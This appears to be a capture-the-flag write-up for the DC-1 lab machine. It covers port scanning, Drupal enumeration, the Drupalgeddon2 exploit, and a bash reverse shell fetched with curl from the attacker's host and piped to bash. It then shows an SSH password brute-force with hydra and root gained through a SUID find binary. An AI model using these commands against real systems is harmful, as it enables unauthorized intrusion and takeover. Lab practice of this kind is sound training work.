# DC-1
## Information Gathering
#### Ports/Services
22/tcp      ssh     
80/tcp      http    
111/tcp     rpcbind 
52369/tcp   status


## Enumeration
### Nmap scan
```bash
PORT      STATE SERVICE REASON         VERSION
22/tcp    open  ssh     syn-ack ttl 63 OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.0)
| ssh-hostkey: 
|   1024 c4:d6:59:e6:77:4c:22:7a:96:16:60:67:8b:42:48:8f (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBAI1NiSeZ5dkSttUT5BvkRgdQ0Ll7uF//UJCPnySOrC1vg62DWq/Dn1ktunFd09FT5Nm/ZP9BHlaW5hftzUdtYUQRKfazWfs6g5glPJQSVUqnlNwVUBA46qS65p4hXHkkl5QO0OHzs8dovwe3e+doYiHTRZ9nnlNGbkrg7yRFQLKPAAAAFQC5qj0MICUmhO3Gj+VCqf3aHsiRdQAAAIAoVp13EkVwBtQQJnS5mY4vPR5A9kK3DqAQmj4XP1GAn16r9rSLUFffz/ONrDWflFrmoPbxzRhpgNpHx9hZpyobSyOkEU3b/hnE/hdq3dygHLZ3adaFIdNVG4U8P9ZHuVUk0vHvsu2qYt5MJs0k1A+pXKFc9n06/DEU0rnNo+mMKwAAAIA/Y//BwzC2IlByd7g7eQiXgZC2pGE4RgO1pQCNo9IM4ZkV1MxH3/WVCdi27fjAbLQ+32cGIzjsgFhzFoJ+vfSYZTI+avqU0N86qT+mDCGCSeyAbOoNq52WtzWId1mqDoOzu7qG52HarRmxQlvbmtifYYTZCJWJcYla2GAsqUGFHw==
|   2048 11:82:fe:53:4e:dc:5b:32:7f:44:64:82:75:7d:d0:a0 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCbDC/6BDEUIa7NP87jp5dQh/rJpDQz5JBGpFRHXa+jb5aEd/SgvWKIlMjUDoeIMjdzmsNhwCRYAoY7Qq2OrrRh2kIvQipyohWB8nImetQe52QG6+LHDKXiiEFJRHg9AtsgE2Mt9RAg2RvSlXfGbWXgobiKw3RqpFtk/gK66C0SJE4MkKZcQNNQeC5dzYtVQqfNh9uUb1FjQpvpEkOnCmiTqFxlqzHp/T1AKZ4RKED/ShumJcQknNe/WOD1ypeDeR+BUixiIoq+fR+grQB9GC3TcpWYI0IrC5ESe3mSyeHmR8yYTVIgbIN5RgEiOggWpeIPXgajILPkHThWdXf70fiv
|   256 3d:aa:98:5c:87:af:ea:84:b8:23:68:8d:b9:05:5f:d8 (ECDSA)
|_ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKUNN60T4EOFHGiGdFU1ljvBlREaVWgZvgWlkhSKutr8l75VBlGbgTaFBcTzWrPdRItKooYsejeC80l5nEnKkNU=
80/tcp    open  http    syn-ack ttl 63 Apache httpd 2.2.22 ((Debian))
| http-robots.txt: 36 disallowed entries 
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
| /LICENSE.txt /MAINTAINERS.txt /update.php /UPGRADE.txt /xmlrpc.php 
| /admin/ /comment/reply/ /filter/tips/ /node/add/ /search/ 
| /user/register/ /user/password/ /user/login/ /user/logout/ /?q=admin/ 
| /?q=comment/reply/ /?q=filter/tips/ /?q=node/add/ /?q=search/ 
|_/?q=user/password/ /?q=user/register/ /?q=user/login/ /?q=user/logout/
|_http-generator: Drupal 7 (http://drupal.org)
|_http-favicon: Unknown favicon MD5: B6341DFC213100C61DB4FB8775878CEC
|_http-title: Welcome to Drupal Site | Drupal Site
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.2.22 (Debian)
111/tcp   open  rpcbind syn-ack ttl 63 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          35779/udp   status
|   100024  1          52369/tcp   status
|   100024  1          53751/udp6  status
|_  100024  1          57980/tcp6  status
52369/tcp open  status  syn-ack ttl 63 1 (RPC #100024)
```

### 22/tcp
- OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.0)
- Supports
	- Public key
	- Password

### 80/tcp
- Software
	- Apache 2.2.22
	- Drupal 7
	- 5.4.45-0+deb7u14

- Drupal 7 is being used on the webserver. I run `droopscan`
```bash
./droopescan scan drupal -u http://192.168.70.193/ -t 16
[+] Plugins found:                                                              
    ctools http://192.168.70.193/sites/all/modules/ctools/
        http://192.168.70.193/sites/all/modules/ctools/LICENSE.txt
        http://192.168.70.193/sites/all/modules/ctools/API.txt
    views http://192.168.70.193/sites/all/modules/views/
        http://192.168.70.193/sites/all/modules/views/README.txt
        http://192.168.70.193/sites/all/modules/views/LICENSE.txt
    profile http://192.168.70.193/modules/profile/
    php http://192.168.70.193/modules/php/
    image http://192.168.70.193/modules/image/

[+] Themes found:
    seven http://192.168.70.193/themes/seven/
    garland http://192.168.70.193/themes/garland/

[+] Possible version(s):
    7.22
    7.23
    7.24
    7.25
    7.26

[+] Possible interesting urls found:
    Default admin - http://192.168.70.193/user/login

[+] Scan finished (0:14:11.271488 elapsed)
```
- This is classic Drupalgeddon2
	- [Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution](https://www.exploit-db.com/exploits/44449) - SUCCESS
```bash
ruby drupal_rce.rb http://192.168.70.193/
DC-1>> whoami
www-data
```

## Exploitation
- Using [this](https://www.exploit-db.com/exploits/44449) exploit, I am able to get foothold on the machine. However, this is only a partially-interactive shell.
- To get a full shell
- Download and execute the reverse shell on the target machine
```bash
echo "bash -i >& /dev/tcp/192.168.49.70/53 0>&1" > shell
python -m http.server
nc -lnvp 53
DC-1>> curl "http://192.1688.49.70:8000/shell" | bash
```
- Then upgrade to a fully interactive shell
```bash
python -c 'import pty;pty.spawn("/bin/bash")'
stty -a speed 38400 baud; rows 82; columns 316; line = 0;
stty raw -echo; fg
export TERM=xterm
```



## Privilege Escalation
### Enumeration
- I run a hydra scan on the user `flag4`
```bash
hydra -l flag4 -P /usr/share/wordlists/rockyou.txt -t 4 ssh://192.168.70.193
```
- I get back the credentials `flag4:orange`

- Searching for SUID binaries
```bash
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null

-rwsr-xr-x 1 root root 88744 Dec 10  2012 /bin/mount
-rwsr-xr-x 1 root root 31104 Apr 13  2011 /bin/ping
-rwsr-xr-x 1 root root 35200 Feb 27  2017 /bin/su
-rwsr-xr-x 1 root root 35252 Apr 13  2011 /bin/ping6
-rwsr-xr-x 1 root root 67704 Dec 10  2012 /bin/umount
-rwxr-sr-x 1 root ssh 128396 Jan 27  2018 /usr/bin/ssh-agent
-rwsr-sr-x 1 daemon daemon 50652 Oct  4  2014 /usr/bin/at
-rwxr-sr-x 1 root mlocate 30492 Sep 25  2010 /usr/bin/mlocate
-rwxr-sr-x 1 root mail 17908 Nov 18  2017 /usr/bin/lockfile
-rwsr-xr-x 1 root root 35892 Feb 27  2017 /usr/bin/chsh
-rwxr-sr-x 1 root shadow 49364 Feb 27  2017 /usr/bin/chage
-rwxr-sr-x 1 root tty 9708 Jun 11  2012 /usr/bin/bsd-write
-rwsr-xr-x 1 root root 45396 Feb 27  2017 /usr/bin/passwd
-rwsr-xr-x 1 root root 30880 Feb 27  2017 /usr/bin/newgrp
-rwsr-xr-x 1 root root 44564 Feb 27  2017 /usr/bin/chfn
-rwxr-sr-x 1 root mail 9768 Nov 30  2014 /usr/bin/mutt_dotlock
-rwxr-sr-x 1 root tty 18020 Dec 10  2012 /usr/bin/wall
-rwxr-sr-x 1 root crontab 34760 Jul  4  2012 /usr/bin/crontab
-rwxr-sr-x 1 root shadow 18168 Feb 27  2017 /usr/bin/expiry
-rwsr-xr-x 1 root root 66196 Feb 27  2017 /usr/bin/gpasswd
-rwsr-sr-x 1 root mail 83912 Nov 18  2017 /usr/bin/procmail
-rwsr-xr-x 1 root root 162424 Jan  6  2012 /usr/bin/find
-rwxr-sr-x 1 root mail 13960 Dec 12  2012 /usr/bin/dotlockfile
-rwsr-xr-x 1 root root 937564 Feb 11  2018 /usr/sbin/exim4
-rwsr-xr-x 1 root root 9660 Jun 20  2017 /usr/lib/pt_chown
-rwsr-xr-x 1 root root 248036 Jan 27  2018 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 5412 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-- 1 root messagebus 321692 Feb 10  2015 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwxr-sr-x 1 root utmp 4972 Feb 21  2011 /usr/lib/utempter/utempter
-rwxr-sr-x 1 root shadow 30332 May  5  2012 /sbin/unix_chkpwd
-rwsr-xr-x 1 root root 84532 May 22  2013 /sbin/mount.nf
```
- `find` is vulnerable to an EoP if it has a SUID bit enabled
```bash
find . -exec /bin/sh \; -quit
```
- This drops you into a root shell